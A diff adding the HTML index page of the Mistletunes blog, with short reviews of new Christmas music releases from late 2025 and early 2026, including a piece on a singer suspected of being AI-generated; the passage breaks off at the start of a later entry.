@@ -1,0 +1,2739 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" id="sixapart-standard">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="generator" content="Movable Type 5.2.9" />
+<link rel="stylesheet" href="http://www.mistletunes.com/styles.css" type="text/css" />
+<link rel="start" href="http://www.mistletunes.com/" title="Home" />
+<link rel="alternate" type="application/atom+xml" title="Recent Entries" href="http://www.mistletunes.com/atom.xml" />
+<script type="text/javascript" src="http://www.mistletunes.com/mt.js"></script>
+<!--
+<rdf:RDF xmlns="http://web.resource.org/cc/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/"
+         xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+<Work rdf:about="http://www.mistletunes.com/">
+<dc:title>Mistletunes</dc:title>
+<dc:description>The ho-ho-home of a rock &apos;n roll Christmas</dc:description>
+<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/3.0/" />
+</Work>
+<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/3.0/">
+</License>
+</rdf:RDF>
+-->
+
+<link rel="canonical" href="http://www.mistletunes.com/" />
+
+    <link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mistletunes.com/rsd.xml" />
+    <title>Mistletunes</title>
+</head>
+<body id="classic-blog" class="mt-main-index layout-twt">
+    <div id="container">
+        <div id="container-inner">
+
+
+            <div id="header">
+    <div id="header-inner">
+        <div id="header-content">
+
+
+            <h1 id="header-name"><a href="http://www.mistletunes.com/" accesskey="1">Mistletunes</a></h1>
+            <h2 id="header-description">The ho-ho-home of a rock 'n roll Christmas</h2>
+
+        </div>
+    </div>
+</div>
+
+
+
+            <div id="content">
+                <div id="content-inner">
+
+
+                    <div id="alpha">
+                        <div id="alpha-inner">
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2026/01/dead-christmas-trees-the-brixton-riot-with-peter-horvath-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2835"
+    dc:title="&quot;Dead Christmas Trees,&quot; The Brixton Riot with Peter Horvath (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2026/01/dead-christmas-trees-the-brixton-riot-with-peter-horvath-self-issued.html"
+    dc:subject="Rock and Pop"
+    dc:description="Pop-punkers from New Jersey recruit the guy from the Anderson Council for lead vocals when the regular guy got sick on this 2025 ode to the organic versions of that holiday icon, or at least the condition they&apos;re in by..."
+    dc:creator="Rudolph"
+    dc:date="2026-01-02T15:22:59-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2836" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2026/01/dead-christmas-trees-the-brixton-riot-with-peter-horvath-self-issued.html" rel="bookmark">"Dead Christmas Trees," The Brixton Riot with Peter Horvath (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2026-01-02T15:22:59-05:00">January  2, 2026  3:22 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2026/01/dead-christmas-trees-the-brixton-riot-with-peter-horvath-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2026/01/dead-christmas-trees-the-brixton-riot-with-peter-horvath-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><img alt="deadxmastrees.jpg" src="http://www.mistletunes.com/art/deadxmastrees.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" />Pop-punkers from New Jersey recruit the guy from the Anderson Council for lead vocals when the regular guy got sick on this 2025 ode to the organic versions of that holiday icon, or at least the condition they're in by this time in the season, anyway. Apparently they recorded this specifically for a Princeton radio station's holiday marathon, which is why it dropped on Christmas Eve. Only available on <a href="https://thebrixtonriot.bandcamp.com/track/dead-christmas-trees" target="_blank">Bandcamp</a> near as I can tell, but worth a trip over there.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2026/01/joy-of-christmas-gladys-knight-many-different-roads.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2834"
+    dc:title="&quot;Joy of Christmas,&quot; Gladys Knight (Many Different Roads)"
+    dc:identifier="http://www.mistletunes.com/2026/01/joy-of-christmas-gladys-knight-many-different-roads.html"
+    dc:subject="Soul/R&amp;B"
+    dc:description="Here&apos;s a new original holiday song for 2025 from one of the great soul singers of the 60s and 70s. No Pips attached, but this is a solid soul ballad, old school with orchestration, and while it won&apos;t make a..."
+    dc:creator="Rudolph"
+    dc:date="2026-01-02T15:15:19-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2835" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2026/01/joy-of-christmas-gladys-knight-many-different-roads.html" rel="bookmark">"Joy of Christmas," Gladys Knight (Many Different Roads)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2026-01-02T15:15:19-05:00">January  2, 2026  3:15 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2026/01/joy-of-christmas-gladys-knight-many-different-roads.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2026/01/joy-of-christmas-gladys-knight-many-different-roads.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/4pmeokP"><img alt="gladysknight.jpg" src="http://www.mistletunes.com/art/gladysknight.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>Here's a new original holiday song for 2025 from one of the great soul singers of the 60s and 70s. No Pips attached, but this is a solid soul ballad, old school with orchestration, and while it won't make a lot of the more adventurous playlists, it's worth noting for those who are of more eclectic bents. Streaming and download everywhere.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2026/01/naughty-and-nice-nyka-monroe-piink.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2833"
+    dc:title="Naughty and Nice, Nyka Monroe (Piink)"
+    dc:identifier="http://www.mistletunes.com/2026/01/naughty-and-nice-nyka-monroe-piink.html"
+    dc:subject="Soul/R&amp;B"
+    dc:description="I&apos;m trying to tread lightly when it comes to questions of authenticity here in the AI era. Nevertheless, Nyka here, advertising herself as an R&apos;nB singer from Houston, throws off a lot of the expected signals for an AI-generated artist...."
+    dc:creator="Rudolph"
+    dc:date="2026-01-01T13:37:28-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2834" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2026/01/naughty-and-nice-nyka-monroe-piink.html" rel="bookmark">Naughty and Nice, Nyka Monroe (Piink)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2026-01-01T13:37:28-05:00">January  1, 2026  1:37 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2026/01/naughty-and-nice-nyka-monroe-piink.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2026/01/naughty-and-nice-nyka-monroe-piink.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/49Ala1F"><img alt="nykamonroe.jpg" src="http://www.mistletunes.com/art/nykamonroe.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>I'm trying to tread lightly when it comes to questions of authenticity here in the AI era. Nevertheless, Nyka here, advertising herself as an R'nB singer from Houston, throws off a lot of the expected signals for an AI-generated artist. Social media accounts that appear to have only been created during 2025 (there's even a short, if inconclusive, Reddit thread asking whether she's real), six albums and a bunch of singles all dated 2025, at least a few of them with cover art that resembles some AI-generated memes, and, on Apple Music, a list of "similar artists" who have the same sorts of tell-tale aspects to their history. As for the music, it's modern slow-jam R'nB with Christmas-oriented lyrics, like "Mistletoe Kisses," "December Crushes," "Red Velvet Christmas," "Naughty List," "Snowed In," "Gift Wrapped," and "Midnight Sleigh Ride." If you didn't have the information I gave you earlier, you'd accept these songs as playlist candidates without question. As with the Dynalectric Orchestra reviewed here earlier, if Nyka isn't made up out of whole cloth and stray electrons, she and her friends are definitely using AI to bulk up her catalog. If AI isn't an issue for you, this streams and downloads everywhere.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2026/01/white-wine-whatever-the-paranoid-style-barnone.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2832"
+    dc:title="&quot;White Wine Whatever,&quot; The Paranoid Style (Bar/None)"
+    dc:identifier="http://www.mistletunes.com/2026/01/white-wine-whatever-the-paranoid-style-barnone.html"
+    dc:subject="Rock and Pop"
+    dc:description="These guys are fronted by author/music critic Elizabeth Nelson and her husband Tim Bracy, and their usual mileu is protest and satire set to solid rock music often featuring members of other groups you might have heard of. For 2025..."
+    dc:creator="Rudolph"
+    dc:date="2026-01-01T13:16:50-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2833" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2026/01/white-wine-whatever-the-paranoid-style-barnone.html" rel="bookmark">"White Wine Whatever," The Paranoid Style (Bar/None)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2026-01-01T13:16:50-05:00">January  1, 2026  1:16 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2026/01/white-wine-whatever-the-paranoid-style-barnone.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2026/01/white-wine-whatever-the-paranoid-style-barnone.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/4jiWIFi"><img alt="paranoidstyle.jpg" src="http://www.mistletunes.com/art/paranoidstyle.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>These guys are fronted by author/music critic Elizabeth Nelson and her husband Tim Bracy, and their usual mileu is protest and satire set to solid rock music often featuring members of other groups you might have heard of. For 2025 they dropped this driving rocker that appears to be about poking fun at people's family bios that they enclose with their Christmas cards. Cool stuff, and it should make you curious about their existing discography. Meanwhile, you can stream or download this in the usual places.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/santa-broke-my-heart-in-2-merry-christmas-harry-berenice-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2831"
+    dc:title="&quot;Santa Broke My Heart in 2 (Merry Christmas Harry),&quot; Berenice (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/santa-broke-my-heart-in-2-merry-christmas-harry-berenice-self-issued.html"
+    dc:subject="Rock and Pop"
+    dc:description="I never encountered this singer before, but she&apos;s not bad, and this 2025 rocker is a really cool piece that I&apos;m sorry I didn&apos;t encounter before now. Starts out slow and poppy, and then the band kicks it into overdrive...."
+    dc:creator="Rudolph"
+    dc:date="2025-12-30T13:30:01-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2832" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/santa-broke-my-heart-in-2-merry-christmas-harry-berenice-self-issued.html" rel="bookmark">"Santa Broke My Heart in 2 (Merry Christmas Harry)," Berenice (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-30T13:30:01-05:00">December 30, 2025  1:30 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/santa-broke-my-heart-in-2-merry-christmas-harry-berenice-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/santa-broke-my-heart-in-2-merry-christmas-harry-berenice-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/4jDuA01"><img alt="berenice.jpg" src="http://www.mistletunes.com/art/berenice.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>I never encountered this singer before, but she's not bad, and this 2025 rocker is a really cool piece that I'm sorry I didn't encounter before now. Starts out slow and poppy, and then the band kicks it into overdrive. Streaming and downloads where you do that business.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/ave-maria-alanis-morissette-epiphany.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2830"
+    dc:title="&quot;Ave Maria,&quot; Alanis Morissette (Epiphany)"
+    dc:identifier="http://www.mistletunes.com/2025/12/ave-maria-alanis-morissette-epiphany.html"
+    dc:subject="Rock and Pop"
+    dc:description="Guess we should note when a big rock star drops something Christmas-related, and for 2025 the perpetrator is one of the 90s biggest stars. She starts out all midnight-mass performance, and then the rhythm section kicks in for some rock..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-30T13:27:58-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2831" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/ave-maria-alanis-morissette-epiphany.html" rel="bookmark">"Ave Maria," Alanis Morissette (Epiphany)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-30T13:27:58-05:00">December 30, 2025  1:27 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/ave-maria-alanis-morissette-epiphany.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/ave-maria-alanis-morissette-epiphany.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/4qAB3eo"><img alt="alanismaria.jpg" src="http://www.mistletunes.com/art/alanismaria.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>Guess we should note when a big rock star drops something Christmas-related, and for 2025 the perpetrator is one of the 90s biggest stars. She starts out all midnight-mass performance, and then the rhythm section kicks in for some rock vibes. Streaming and downloads.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/auld-lang-syne-kilgore-trout-basement-in-cohoes.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2829"
+    dc:title="&quot;Auld Lang Syne,&quot; Kilgore Trout (Basement in Cohoes)"
+    dc:identifier="http://www.mistletunes.com/2025/12/auld-lang-syne-kilgore-trout-basement-in-cohoes.html"
+    dc:subject="Rock and Pop"
+    dc:description="I could find nothing out about this guy other than the fact that he borrowed his name from Kurt Vonnegut. This is a short, less than two-minute rendition of the fabled year-ending song with acoustic guitar and flute but with..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-30T13:22:04-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2830" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/auld-lang-syne-kilgore-trout-basement-in-cohoes.html" rel="bookmark">"Auld Lang Syne," Kilgore Trout (Basement in Cohoes)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-30T13:22:04-05:00">December 30, 2025  1:22 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/auld-lang-syne-kilgore-trout-basement-in-cohoes.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/auld-lang-syne-kilgore-trout-basement-in-cohoes.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/49xEUD3"><img alt="kilgoretrout.jpg" src="http://www.mistletunes.com/art/kilgoretrout.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>I could find nothing out about this guy other than the fact that he borrowed his name from Kurt Vonnegut. This is a short, less than two-minute rendition of the fabled year-ending song with acoustic guitar and flute but with a mild indie-rock vibe to it. Streaming and downloads everywhere.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/arbor-christmas-volume-26-various-artists-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2828"
+    dc:title="Arbor Christmas: Volume 26, various artists (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/arbor-christmas-volume-26-various-artists-self-issued.html"
+    dc:subject="Rock and Pop"
+    dc:description="This is the first time I&apos;ve encountered this ongoing series of Christmas compilations by a bunch of New Jersey people led by a fellow named Jon Montague, who helmed the first year&apos;s collection before passing away. His friends have continued..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-29T14:11:05-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2829" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/arbor-christmas-volume-26-various-artists-self-issued.html" rel="bookmark">Arbor Christmas: Volume 26, various artists (self-issued)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-29T14:11:05-05:00">December 29, 2025  2:11 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/arbor-christmas-volume-26-various-artists-self-issued.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/arbor-christmas-volume-26-various-artists-self-issued.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><img alt="arborxmas.jpg" src="http://www.mistletunes.com/art/arborxmas.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" />This is the first time I've encountered this ongoing series of Christmas compilations by a bunch of New Jersey people led by a fellow named Jon Montague, who helmed the first year's collection before passing away. His friends have continued the series ever since for the benefit of the Arbor Foundation. This is more of a long EP than an album, and it kicks off with Tom Ryan &amp; Friends' "Westward Leaning," a fairly yearning Americana ballad, going into It's a King Thing's "Rockin With Santa Claus," a short but snappy pop rocker, and Mark Martucci's "In the Furs," a midtempo number led by organ and old-school rhythm box. Joy Riding give us "This Ain't a Race," an indie-pop shuffle, Old Souls offer the moody instrumental ballad "Lakota," The 1910 Chainsaw Co. do Tom Petty's "Christmas All Over Again," The Only Ghost In Town offer the acoustic rocker "The Room Is Cold," and Damn the Lions wrap things up with the indie-sounding "Snow Folks," which takes a poke at commercialism, including this site's putative sponsor. The collection only appears on <a href="https://arborchristmas.bandcamp.com/album/arbor-christmas-volume-26" target="_blank">Bandcamp</a>, along with previous editions, but I did find a few of the older albums, along with <a href="https://amzn.to/4bhlG5Q" target="_blank">"Rockin' With Santa Claus,"</a> on Amazon.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/alice-coopers-a-taste-of-christmas-pudding-2025-various-artists-soundvision.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2827"
+    dc:title="Alice Cooper&apos;s A Taste of Christmas Pudding 2025, various artists (SoundVision)"
+    dc:identifier="http://www.mistletunes.com/2025/12/alice-coopers-a-taste-of-christmas-pudding-2025-various-artists-soundvision.html"
+    dc:subject="Rock and Pop"
+    dc:description="We&apos;ve previously noted Alice Cooper&apos;s foundation that provides musical education to at-risk youths and their ongoing habit of issuing Christmas music collections based on their annual Christmas concerts. As always, the benefactor&apos;s musical past and influences are big influences in..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-29T14:03:36-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2828" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/alice-coopers-a-taste-of-christmas-pudding-2025-various-artists-soundvision.html" rel="bookmark">Alice Cooper's A Taste of Christmas Pudding 2025, various artists (SoundVision)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-29T14:03:36-05:00">December 29, 2025  2:03 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/alice-coopers-a-taste-of-christmas-pudding-2025-various-artists-soundvision.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/alice-coopers-a-taste-of-christmas-pudding-2025-various-artists-soundvision.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p><a href="https://amzn.to/48ZNIl6"><img alt="pudding25.jpg" src="http://www.mistletunes.com/art/pudding25.jpg" width="150" height="150" class="mt-image-right" style="float: right; margin: 0 0 20px 20px;" /></a>We've <a href="http://www.mistletunes.com/2020/01/a-taste-of-christmas-pudding-2019-various-artists-casa-music-group.html" target="_blank">previously</a> noted Alice Cooper's foundation that provides musical education to at-risk youths and their ongoing habit of issuing Christmas music collections based on their annual Christmas concerts. As always, the benefactor's musical past and influences are big influences in what the students come up with, as in Pinup's imaginative deconstruction of "God Rest Ye Merry Gentlemen," Vipera's "O Come O Come Emanuel," Faultline's "What Child Is This," Plum's "Sugar Plum Pudding" that starts out as "Santa Claus Is Coming To Town," and Distorted's "Feliz Navidad," but there are more poppy items like Zayah's "It's Beginning To Look a Lot Like Christmas," Lizzie's "You're a Mean One Mr. Grinch," Dually Noted's "Underneath the Tree," Sammie Jaclyn's "Grown Up Christmas List," and Evelyn Errante's acoustic reading of the traditional "O Holy Night." Mitchael has a poppy rocker in "This Christmas," not the Donny Hathaway song, and Dylan Dean does "O Holy Night" in a more rocked-up arrangement while sneaking in Leonard Cohen's "Hallelujah." Some decent playlist candidates here, although the poppier entries have a flavor of "theatre kid" about them. Streaming and downloads wherever you shop. Oh, in case you have trouble searching this out, the artist name in the metadata is "Proof Is in The Pudding." And since I missed it last year, here's the <a href="https://amzn.to/3N7XnNP" target="_blank">2024 edition</a> of this series.</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/not-for-sale-polar-bear-queen-emi.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2826"
+    dc:title="&quot;Not For Sale (Polar Bear),&quot; Queen (EMI)"
+    dc:identifier="http://www.mistletunes.com/2025/12/not-for-sale-polar-bear-queen-emi.html"
+    dc:subject="Rock and Pop"
+    dc:description="This is from the sessions for the Queen II album and is previously unreleased. It&apos;s a Brian May song and he revealed its existence on British radio this week. Not strongly Christmasy, but it does have a compatible vibe as..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-27T13:16:22-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2827" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <h2 class="asset-name entry-title"><a href="http://www.mistletunes.com/2025/12/not-for-sale-polar-bear-queen-emi.html" rel="bookmark">"Not For Sale (Polar Bear)," Queen (EMI)</a></h2>
+        <div class="asset-meta">
+            <span class="byline">
+    
+                By <span class="vcard author">Rudolph</span> on <abbr class="published" title="2025-12-27T13:16:22-05:00">December 27, 2025  1:16 PM</abbr>
+    
+            </span>
+
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/not-for-sale-polar-bear-queen-emi.html#comments">No Comments</a>
+            <span class="separator">|</span> <a href="http://www.mistletunes.com/2025/12/not-for-sale-polar-bear-queen-emi.html#trackbacks">No TrackBacks</a>
+
+        </div>
+    </div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+            <p>This is from the sessions for the <strong>Queen II</strong> album and is previously unreleased. It's a Brian May song and he revealed its existence on British radio this week. Not strongly Christmasy, but it does have a compatible vibe as it goes on about wintry topics. Apparently the song came from Brian's previous band Smile originally. An expanded version of <strong>Queen II</strong> is set for release in 2026 and this will be on it, until then it's only on YouTube.</p>
+<p>
+<iframe width="480" height="315" src="https://www.youtube.com/embed/Oz7KhMqEWAk?si=uo5r1FlLfE6KJexz" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+</p>
+        </div>
+
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+
+                            
+                            <!--
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+         xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
+         xmlns:dc="http://purl.org/dc/elements/1.1/">
+<rdf:Description
+    rdf:about="http://www.mistletunes.com/2025/12/secret-santa-chance-the-rapper-and-jeremih-self-issued.html"
+    trackback:ping="http://www.mistletunes.com/cgi-bin/mt/mt-tb.cgi/2825"
+    dc:title="Secret Santa, Chance the Rapper and Jeremih (self-issued)"
+    dc:identifier="http://www.mistletunes.com/2025/12/secret-santa-chance-the-rapper-and-jeremih-self-issued.html"
+    dc:subject="Hip-Hop"
+    dc:description="These two hip-hoppers have previously released Christmas collections of tunes going back to 2016, and they&apos;re back in 2025 with this five-song EP that dropped Christmas day. All are mid-tempo jams and fairly lively-sounding, my choices here would be &quot;Black..."
+    dc:creator="Rudolph"
+    dc:date="2025-12-27T13:14:24-05:00" />
+</rdf:RDF>
+-->
+
+<div id="entry-2826" class="entry-asset asset hentry">
+    <div class="asset-header">
